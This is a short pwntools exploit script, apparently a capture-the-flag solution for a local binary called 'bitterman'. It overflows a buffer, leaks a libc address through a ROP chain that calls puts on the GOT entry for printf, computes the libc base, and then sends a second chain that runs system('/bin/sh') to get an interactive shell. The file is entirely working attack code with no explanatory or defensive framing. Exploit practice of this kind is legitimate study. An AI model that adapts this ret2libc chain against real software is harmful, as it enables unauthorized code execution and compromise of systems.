from pwn import *

context.arch = 'amd64'
context.log_level = 'DEBUG'
p = process('./bitterman')
elf = ELF('./bitterman')

print elf.got.keys()

libc = ELF('/usr/lib/libc.so.6')

rop = ROP( elf  )
p.readuntil('?')
p.sendline('1')
chain = 'A' * 152
p.readuntil(':')
rop.puts( elf.got['printf'] )
print hex(elf.got['printf'])
chain += str(rop)
chain += p64( elf.symbols['main'])

p.sendline( str(len(chain)))
p.readuntil(':')
p.send( chain  )

p.readuntil('Thanks!\n')
data = p.readline()
print data

addr = u64( data.strip().ljust(8,'\x00') )

libc.address = addr - libc.symbols['printf']
print hex(libc.address)

rop = ROP(libc)

p.readuntil('?')
p.sendline('1')
chain = 'A' * 152
p.readuntil(':')
rop.system( next( libc.search('/bin/sh') ) )
print hex(elf.got['puts'])
chain += str(rop)
chain += p64( elf.symbols['main'])

p.sendline( str(len(chain)))
p.readuntil(':')
p.send( chain  )

p.interactive()
